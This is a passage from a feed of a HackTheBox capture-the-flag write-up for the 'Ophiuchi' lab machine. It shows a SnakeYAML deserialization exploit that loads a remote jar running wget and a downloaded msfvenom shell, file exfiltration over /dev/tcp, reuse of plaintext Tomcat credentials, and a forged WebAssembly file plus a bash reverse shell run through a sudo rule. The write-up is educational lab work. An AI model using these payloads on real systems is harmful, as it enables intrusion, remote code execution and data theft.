<li>Nmap</li>
<li>Java Compiler</li>
<li><a href="https://github.com/artsploit/yaml-payload">Yaml-payload</a></li>
<li><a href="https://github.com/WebAssembly/wabt">Wabt</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan using <code>nmap</code> discovers 2 open ports: SSH on port 22 and an Apache Tomcat servlet on port 8080.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «ophiuchi» «10.10.14.53» 
$ nmap -p- --reason -oA nmap/10-tcp-allport-ophiuchi 10.10.10.227                                           
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-17 10:09 EDT
Nmap scan report <span class="k">for</span> 10.10.10.227
Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.056s latency<span class="o">)</span>.
Not shown: <span class="m">65533</span> closed ports
Reason: <span class="m">65533</span> resets
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl <span class="m">63</span>
8080/tcp open  http-proxy syn-ack ttl <span class="m">63</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 77.26 seconds

→ root@kali «ophiuchi» «10.10.14.53» 
$ nmap -p22,8080 -sC -sV -oA nmap/10-tcp-allport-scripts-ophiuchi 10.10.10.227
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-17 10:21 EDT
Nmap scan report <span class="k">for</span> 10.10.10.227
Host is up <span class="o">(</span>0.055s latency<span class="o">)</span>.

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
8080/tcp open  http    Apache Tomcat 9.0.38
<span class="p">|</span>_http-title: Parse YAML
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 9.35 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-8080---website">TCP 8080 - Website</h3>
<p>On port 8080, the machine hosts a site that serves a YAML parser service.</p>
<p><img class="img-container" src="imgs/image-20210617212718924.png" alt="image-20210617212718924"  />
</p>
<p>When I submit a sample YAML payload, it returns the following message.</p>
<p><img class="img-container" src="imgs/image-20210729200644337.png" alt="image-20210729200644337"  />
</p>
<p>But, if I send an invalid payload, for example:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">test: test
  test: test
</code></pre></div><p>I get the following results:</p>
<p><img class="img-container" src="imgs/image-20210729200616087.png" alt="image-20210729200616087"  />
</p>
<p>From the error above, I noticed the <code>org.yaml.snake.yaml.load</code> package is being used. This package is typically used for <a href="https://www.baeldung.com/java-snake-yaml#basic-usage">YAML deserialization</a>.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-tomcat">Shell as tomcat</h3>
<h4 id="snakeyaml-insecure-deserialization---poc">SnakeYAML Insecure Deserialization - PoC</h4>
<p>Although the web app said the parser feature is temporarily on hold, I&rsquo;m sure that each payload I submit is being processed on the backend.</p>
<p>Searching on Google about the Snake YAML deserialization attack, I came across <a href="https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html">this post</a>. This is exactly what I need. I took the payload from that post and modified the URL to point to my HTB IP. I will setup a netcat listener and submit the payload to the parser.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="cp">!!javax.script.ScriptEngineManager</span><span class="w"> </span><span class="p">[</span><span class="w">
</span><span class="w">  </span><span class="cp">!!java.net.URLClassLoader</span><span class="w"> </span><span class="p">[[</span><span class="w">
</span><span class="w">    </span><span class="cp">!!java.net.URL</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;http://10.10.14.23/iamf&#34;</span><span class="p">]</span><span class="w">
</span><span class="w">  </span><span class="p">]]</span><span class="w">
</span><span class="w"></span><span class="p">]</span><span class="w">
</span></code></pre></div><p>On my listener, I get the following request.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «ophiuchi» «10.10.14.23» 
$ nc -nvlp <span class="m">80</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
connect to <span class="o">[</span>10.10.14.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227<span class="o">]</span> <span class="m">53002</span>
GET /iamf HTTP/1.1
User-Agent: Java/11.0.8
Host: 10.10.14.23
Accept: text/html, image/gif, image/jpeg, *<span class="p">;</span> <span class="nv">q</span><span class="o">=</span>.2, */*<span class="p">;</span> <span class="nv">q</span><span class="o">=</span>.2
Connection: keep-alive
</code></pre></div><p><img class="img-container" src="imgs/image-20210729202237145.png" alt="image-20210729202237145"  />
</p>
<p>That means the parser is vulnerable to insecure deserialization attack!</p>
<h4 id="snakeyaml-insecure-deserialization---weaponize">SnakeYAML Insecure Deserialization - Weaponize</h4>
<p>The researcher on the previous post uses a <code>.jar</code> payload from <a href="https://github.com/artsploit/yaml-payload">this Github repo</a> to get a code execution. I will clone that repo to my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
$ git clone https://github.com/artsploit/yaml-payload.git <span class="o">&amp;&amp;</span> <span class="nb">cd</span> yaml-payload
Cloning into <span class="s1">&#39;yaml-payload&#39;</span>...
remote: Enumerating objects: 10, <span class="k">done</span>.
remote: Total <span class="m">10</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">10</span>
Receiving objects: 100% <span class="o">(</span>10/10<span class="o">)</span>, <span class="k">done</span>.
</code></pre></div><p>Then I will modify <code>AwesomeScriptEngineFactory.java</code> file to grab my malicious binary and execute it afterwards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">artsploit</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.script.ScriptEngine</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.script.ScriptEngineFactory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.List</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">AwesomeScriptEngineFactory</span> <span class="kd">implements</span> <span class="n">ScriptEngineFactory</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="nf">AwesomeScriptEngineFactory</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;wget http://10.10.14.23/iamf-shell -O /tmp/iamf-shell;&#34;</span><span class="o">);</span>
            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;chmod +x /tmp/iamf-shell&#34;</span><span class="o">);</span>
            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;/tmp/iamf-shell&#34;</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
    
<span class="o">...[</span><span class="n">SNIP</span><span class="o">]...</span>
<span class="o">}</span>

</code></pre></div><p>I will compile the code and pack the whole <code>src/</code> folder into a java archive (jar) file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «yaml-payload» «10.10.14.23» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
$  javac src/artsploit/AwesomeScriptEngineFactory.java <span class="o">&amp;&amp;</span> jar -cvf yaml-payload.jar -C src/ .
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span class="o">=</span>on -Dswing.aatext<span class="o">=</span><span class="nb">true</span>
adding: META-INF/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
adding: META-INF/MANIFEST.MF <span class="o">(</span><span class="nv">in</span><span class="o">=</span>56<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>56<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
adding: ./ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
adding: META-INF/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
adding: META-INF/services/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
adding: META-INF/services/javax.script.ScriptEngineFactoed -5%<span class="o">)</span>
adding: artsploit/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
adding: artsploit/AwesomeScriptEngineFactory.class <span class="o">(</span><span class="nv">in</span><span class="o">=</span>1%<span class="o">)</span>
adding: artsploit/AwesomeScriptEngineFactory.java~ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>5<span class="o">)</span>
adding: artsploit/AwesomeScriptEngineFactory.java <span class="o">(</span><span class="nv">in</span><span class="o">=</span>16<span class="o">)</span>
Total:
------
<span class="o">(</span><span class="nv">in</span> <span class="o">=</span> 4083<span class="o">)</span> <span class="o">(</span><span class="nv">out</span> <span class="o">=</span> 2846<span class="o">)</span> <span class="o">(</span>deflated 30%<span class="o">)</span>
</code></pre></div><p>Then I will create my malicious binary using <code>msfvenom</code>. This binary along with the jar will be hosted using a Python web server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
$ msfvenom -p linux/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.14.23 <span class="nv">lport</span><span class="o">=</span><span class="m">53</span> -f elf -o iamf-shell
<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: <span class="m">74</span> bytes
Final size of elf file: <span class="m">194</span> bytes
Saved as: iamf-shell
</code></pre></div><p>Finally, I will setup a netcat listener and submit the following payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="cp">!!javax.script.ScriptEngineManager</span><span class="w"> </span><span class="p">[</span><span class="w">
</span><span class="w">  </span><span class="cp">!!java.net.URLClassLoader</span><span class="w"> </span><span class="p">[[</span><span class="w">
</span><span class="w">    </span><span class="cp">!!java.net.URL</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;http://10.10.14.23/yaml-payload.jar&#34;</span><span class="p">]</span><span class="w">
</span><span class="w">  </span><span class="p">]]</span><span class="w">
</span><span class="w"></span><span class="p">]</span><span class="w">
</span></code></pre></div><p>Within a few seconds, I get an interactive shell as tomcat.</p>
<p><img class="img-container" src="imgs/image-20210729220701287.png" alt="image-20210729220701287"  />
</p>
<h4 id="shell-upgrade">Shell Upgrade</h4>
<p>As usual, I will do the PTY trick to upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">which script
/usr/bin/script                                                     
script /dev/null -c bash                                            
Script started, file is /dev/null                                   
tomcat@ophiuchi:/$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
tomcat@ophiuchi:/$ ^Z 
<span class="o">[</span>2<span class="o">]</span>  + <span class="m">7400</span> suspended  nc -nvlp <span class="m">53</span>
→ kali@kali «exploits» «10.10.14.23» 
$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>2<span class="o">]</span>  - <span class="m">7400</span> continued  nc -nvlp <span class="m">53</span>

tomcat@ophiuchi:/$ stty rows <span class="m">30</span> cols <span class="m">126</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-admin">Shell as admin</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>There are only two users in this machine who have login shell: <code>root</code> and <code>admin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">tomcat@ophiuchi:/opt/tomcat$ cat /etc/passwd <span class="p">|</span> grep sh$
root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000:,,,:/home/admin:/bin/bash
</code></pre></div><p>Using <code>grep</code> to search for a &ldquo;password&rdquo; recursively on the tomcat home directory (<code>/opt/tomcat</code>) reveals a set of credentials for user <code>admin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">tomcat@ophiuchi:/opt/tomcat$ grep -Ri <span class="s2">&#34;password&#34;</span> 
...<span class="o">[</span>SNIP<span class="o">]</span>...
conf/tomcat-users.xml:&lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">&#34;admin&#34;</span> <span class="nv">password</span><span class="o">=</span><span class="s2">&#34;whythereisalimit&#34;</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">&#34;manager-gui,admin-gui&#34;</span>/&gt;     ...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="ssh---admin">SSH - admin</h4>
<p>The password <code>whythereisalimit</code>  works on SSH for user <code>admin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
$ ssh admin@10.10.10.227 
admin@10.10.10.227<span class="err">&#39;</span>s password: 
Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-51-generic x86_64<span class="o">)</span>

...<span class="o">[</span>SNIP<span class="o">]</span>...

  System load:             0.08
  Usage of /:              19.9% of 27.43GB
  Memory usage:            17%
  Swap usage:              0%
  Processes:               <span class="m">214</span>
  Users logged in:         <span class="m">0</span>
  IPv4 address <span class="k">for</span> ens160: 10.10.10.227
  IPv6 address <span class="k">for</span> ens160: dead:beef::250:56ff:feb9:90cf


...<span class="o">[</span>SNIP<span class="o">]</span>...

Last login: Mon Jan <span class="m">11</span> 08:23:12 <span class="m">2021</span> from 10.10.14.2
admin@ophiuchi:~$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span>
</code></pre></div><p>User flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>User <code>admin</code> is allowed to run a Go program as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:~$ sudo -l
Matching Defaults entries <span class="k">for</span> admin on ophiuchi:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User admin may run the following commands on ophiuchi:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
</code></pre></div><h4 id="source-code-analysis---indexgo">Source Code Analysis - index.go</h4>
<p>What <code>index.go</code> does is:</p>
<ul>
<li>It reads a web assembly file called <code>main.wasm</code> and creates an instance of that file.</li>
<li>It then exports a function called &ldquo;info&rdquo; from the instance and executes it. If the results of that function is &ldquo;1&rdquo;, it runs the <code>deploy.sh</code> file.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
        <span class="s">&#34;fmt&#34;</span>
        <span class="nx">wasm</span> <span class="s">&#34;github.com/wasmerio/wasmer-go/wasmer&#34;</span>
        <span class="s">&#34;os/exec&#34;</span>
        <span class="s">&#34;log&#34;</span>
<span class="p">)</span>


<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">bytes</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nf">ReadBytes</span><span class="p">(</span><span class="s">&#34;main.wasm&#34;</span><span class="p">)</span>

        <span class="nx">instance</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nf">NewInstance</span><span class="p">(</span><span class="nx">bytes</span><span class="p">)</span>
        <span class="k">defer</span> <span class="nx">instance</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
        <span class="nx">init</span> <span class="o">:=</span> <span class="nx">instance</span><span class="p">.</span><span class="nx">Exports</span><span class="p">[</span><span class="s">&#34;info&#34;</span><span class="p">]</span>
        <span class="nx">result</span><span class="p">,</span><span class="nx">_</span> <span class="o">:=</span> <span class="nf">init</span><span class="p">()</span>
        <span class="nx">f</span> <span class="o">:=</span> <span class="nx">result</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">f</span> <span class="o">!=</span> <span class="s">&#34;1&#34;</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Not ready to deploy&#34;</span><span class="p">)</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Ready to deploy&#34;</span><span class="p">)</span>
                <span class="nx">out</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="s">&#34;deploy.sh&#34;</span><span class="p">).</span><span class="nf">Output</span><span class="p">()</span>
                <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
                        <span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
                <span class="p">}</span>
                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">))</span>
        <span class="p">}</span>
<span class="p">}</span>

</code></pre></div><p>Also, it&rsquo;s important to note that this <code>index.go</code> loads  <code>deploy.sh</code> and <code>main.wasm</code> with relative path. The <code>deploy.sh</code> and <code>main.wasm</code> themself can be found under <code>/opt/wasms-functions</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:/opt/wasm-functions$ ls -lah
total 3.9M
drwxr-xr-x <span class="m">3</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> .
drwxr-xr-x <span class="m">5</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> ..
drwxr-xr-x <span class="m">2</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> backup
-rw-r--r-- <span class="m">1</span> root root   <span class="m">88</span> Oct <span class="m">14</span>  <span class="m">2020</span> deploy.sh
-rwxr-xr-x <span class="m">1</span> root root 2.5M Oct <span class="m">14</span>  <span class="m">2020</span> index
-rw-rw-r-- <span class="m">1</span> root root  <span class="m">522</span> Oct <span class="m">14</span>  <span class="m">2020</span> index.go
-rwxrwxr-x <span class="m">1</span> root root 1.5M Oct <span class="m">14</span>  <span class="m">2020</span> main.wasm
</code></pre></div><p>The <code>deploy.sh</code> contains a to-do note of a lazy admin.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:/opt/wasm-functions$ cat deploy.sh 
<span class="c1">#!/bin/bash</span>

<span class="c1"># ToDo</span>
<span class="c1"># Create script to automatic deploy our new web at tomcat port 8080</span>
</code></pre></div><p>From here, I will exfil the entire <code>/opt/wasm-functions/</code> to my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:/opt$ tar -czvf /tmp/wasm-functions.tar.gz wasm-functions/
wasm-functions/
wasm-functions/index
wasm-functions/index.go
wasm-functions/deploy.sh
wasm-functions/main.wasm
wasm-functions/backup/
wasm-functions/backup/index.go
wasm-functions/backup/deploy.sh
wasm-functions/backup/main.wasm
admin@ophiuchi:/opt$ cat /tmp/wasm-functions.tar.gz &gt; /dev/tcp/10.10.14.23/53
</code></pre></div><p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
$ nc -nvlp <span class="m">53</span> &gt; wasm-functions.tar.gz
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227<span class="o">]</span> <span class="m">45380</span>
</code></pre></div><h4 id="reversing-mainwasm">Reversing main.wasm</h4>
<p>Now I need to find out the content of <code>main.wasm</code>. Fortunately there is a tool to {de,re}compile a wasm file, called <a href="https://github.com/WebAssembly/wabt/">wabt</a>. I will clone the repo and make the tool available to system-wide.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ wget https://github.com/WebAssembly/wabt/releases/download/1.0.23/wabt-1.0.23-ubuntu.tar.gz -O /opt/
$ tar -xvf /opt/wabt-1.0.23-ubuntu.tar.gz
$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="s2">&#34;/opt/wabt-1.0.23/bin&#34;</span>:<span class="nv">$PATH</span>
</code></pre></div><p>I will decompile the <code>main.wasm</code> using <code>wasm-decompile</code>. It shows that the <code>info</code> function has return value of 0.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «wasm-functions» «10.10.14.23» 
$ wasm-decompile main.wasm 
<span class="nb">export</span> memory memory<span class="o">(</span>initial: 16, max: 0<span class="o">)</span><span class="p">;</span>

global g_a:int <span class="o">=</span> 1048576<span class="p">;</span>
<span class="nb">export</span> global data_end:int <span class="o">=</span> 1048576<span class="p">;</span>
<span class="nb">export</span> global heap_base:int <span class="o">=</span> 1048576<span class="p">;</span>

table T_a:funcref<span class="o">(</span>min: 1, max: 1<span class="o">)</span><span class="p">;</span>

<span class="nb">export</span> <span class="k">function</span> info<span class="o">()</span>:int <span class="o">{</span>
  <span class="k">return</span> <span class="m">0</span>
<span class="o">}</span>
</code></pre></div><h4 id="exploitation">Exploitation</h4>
<p>Since I need a return value of 1, so that <code>index.go</code> will execute the <code>deploy.sh</code>, I will create my own <code>main.wasm</code> file from the exfiltrated <code>main.wasm</code> using <code>wasm2wat</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
$ wasm2wat ../loot/wasm-functions/main.wasm <span class="p">|</span> tee main.wat
<span class="o">(</span>module
  <span class="o">(</span><span class="nb">type</span> <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>func <span class="o">(</span>result i32<span class="o">)))</span>
  <span class="o">(</span>func <span class="nv">$info</span> <span class="o">(</span><span class="nb">type</span> 0<span class="o">)</span> <span class="o">(</span>result i32<span class="o">)</span>
    i32.const 0<span class="o">)</span>
  <span class="o">(</span>table <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="m">1</span> <span class="m">1</span> funcref<span class="o">)</span>
  <span class="o">(</span>memory <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> 16<span class="o">)</span>
  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>mut i32<span class="o">)</span> <span class="o">(</span>i32.const 1048576<span class="o">))</span>
  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>1<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>2<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;memory&#34;</span> <span class="o">(</span>memory 0<span class="o">))</span>
  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;info&#34;</span> <span class="o">(</span>func <span class="nv">$info</span><span class="o">))</span>
  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;__data_end&#34;</span> <span class="o">(</span>global 1<span class="o">))</span>
  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;__heap_base&#34;</span> <span class="o">(</span>global 2<span class="o">)))</span>
</code></pre></div><p>Then I will modify the return value of the info function to 1.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">...<span class="o">[</span>SNIP<span class="o">]</span>...
  <span class="o">(</span>func <span class="nv">$info</span> <span class="o">(</span><span class="nb">type</span> 0<span class="o">)</span> <span class="o">(</span>result i32<span class="o">)</span>
    i32.const 1<span class="o">)</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>I will compile the <code>main.wat</code> back to <code>main.wasm</code> using <code>wat2wasm</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
$ wat2wasm main.wat 
</code></pre></div><p>Then I will create my own <code>deploy.sh</code> that contains a reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
$ cat deploy.sh 
<span class="c1">#!/bin/sh</span>
bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.23/53 0&gt;&amp;1&#34;</span>
</code></pre></div><p>I will transfer my <code>main.wasm</code> and <code>deploy.sh</code> using <code>scp</code> to<code>/tmp/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
$ scp main.wasm deploy.sh  admin@10.10.10.227:/tmp
admin@10.10.10.227<span class="err">&#39;</span>s password: 
main.wasm                                                                                   100%  <span class="m">112</span>     1.7KB/s   00:00    
deploy.sh                                                                                   100%   <span class="m">60</span>     1.1KB/s   00:00 
</code></pre></div><p>Finally, I will setup a netcat listener and run the allowed sudo command on the <code>/tmp/</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go
</code></pre></div><p>Now I have a root shell on my listener.</p>
<pre><code>→ kali@kali «exploits» «10.10.14.23» 
$ nc -nvlp 53
listening on [any] 53 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.227] 45382
root@ophiuchi:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ophiuchi:/tmp# 
</code></pre><p><img class="img-container" src="imgs/image-20210729230638797.png" alt="image-20210729230638797"  />
</p>
<hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li>
<p><a href="https://www.baeldung.com/java-snake-yaml">https://www.baeldung.com/java-snake-yaml</a></p>
</li>
<li>
<p><a href="https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html">https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html</a></p>
</li>
<li>
<p><a href="https://webassembly.github.io/wabt/">https://webassembly.github.io/wabt/</a></p>
</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Traverxec</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-traverxec/</link>
      <pubDate>Fri, 06 Aug 2021 16:12:18 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-traverxec/</guid>
      <description>Traverxec is an easy Linux machine that starts with exploitation of a Nostromo web server. The server is vulnerable to a remote code execution, and this allows me to gain an interactive shell access into the system. Enumeration of the system discovers a backup files that contains user SSH keys. The user is allowed to run a sudo on journalctl binary, and this could be leveraged to obtain root access.</description>
